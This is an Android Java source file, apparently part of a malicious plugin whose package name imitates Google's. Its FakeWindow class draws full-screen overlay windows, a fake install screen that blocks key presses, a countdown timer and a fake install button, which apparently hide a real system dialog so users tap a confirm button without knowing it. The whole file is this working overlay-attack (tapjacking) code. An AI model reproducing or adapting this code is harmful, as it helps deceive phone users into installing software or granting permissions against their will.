package com.xstd.plugin.Utils;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.util.DisplayMetrics;
import android.view.*;
import android.widget.TextView;
import com.googl.plugin.x.R;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.config.Config;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: PM10:19
 * To change this template use File | Settings | File Templates.
 */
public class FakeWindow {

    public static interface WindowListener {

        void onWindowPreDismiss();

        void onWindowDismiss();
    }

    private View coverView;
    private View timerView;
    private TextView timeTV;
    private View installView;
    private Context context;
    private WindowManager wm;
    private int count = 5;
    private Handler handler;

    private WindowListener mWindowListener;

    public FakeWindow(Context context, WindowListener l) {
        this.context = context;
        LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        coverView = layoutInflater.inflate(R.layout.fake_install, null);
        timerView = layoutInflater.inflate(R.layout.fake_timer, null);
        timeTV = (TextView) timerView.findViewById(R.id.timer);
        installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
        wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        handler = new Handler(context.getMainLooper());

        mWindowListener = l;
    }

    public void updateTimerCount() {
        if (count <= 0) {
            if (mWindowListener != null) {
                mWindowListener.onWindowDismiss();
            }
            if (coverView != null && timerView != null) {
                if (Config.DEBUG_IF_GO_HOME) {
                    UtilsRuntime.goHome(context);
                }
                wm.removeView(coverView);
                wm.removeView(timerView);
                wm.removeView(installView);
            }
            coverView = null;
            timerView = null;
            installView = null;
        } else {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (coverView != null && timerView != null) {
                        timeTV.setText(String.format(context.getString(R.string.fake_timer), count));
                        count--;

                        if (count == 0) {
                            if (mWindowListener != null) {
                                mWindowListener.onWindowPreDismiss();
                            }
                        }

                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                updateTimerCount();
                            }
                        }, 1000);
                    }
                }
            });
        }

    }

    public void dismiss() {
//            if (coverView != null && timerView != null) {
//                wm.removeView(coverView);
//                wm.removeView(timerView);
//            }
//            coverView = null;
//            timerView = null;
//            fake = null;
    }

    public void show() {
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(dm);
        int screenWidth = dm.widthPixels;
        int screenHeight = dm.heightPixels;
        float density = dm.density;

        //install
        WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
        confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
        confirmBtnParams.format = PixelFormat.RGBA_8888;
        confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        confirmBtnParams.width = (int) (60 * density);
        confirmBtnParams.height = (int) (48 * density);
        confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (20 * density);
//            confirmBtnParams.x = screenWidth / 2 ;
        confirmBtnParams.y = screenHeight - (int) (48 * density);
        wm.addView(installView, confirmBtnParams);

        //timer
        WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
        btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
        btnParams.format = PixelFormat.RGBA_8888;
        btnParams.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        btnParams.width = screenWidth / 2;
        btnParams.height = (int) (48 * density);
        btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
        wm.addView(timerView, btnParams);

        //cover
        WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
        wMParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
        wMParams.format = PixelFormat.RGBA_8888;
        wMParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
        wMParams.width = WindowManager.LayoutParams.FILL_PARENT;
        wMParams.height = screenHeight - (int) ((48 + 25) * density);
        wMParams.gravity = Gravity.LEFT | Gravity.TOP;
        coverView.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                return true;
            }
        });
        wm.addView(coverView, wMParams);
    }

}
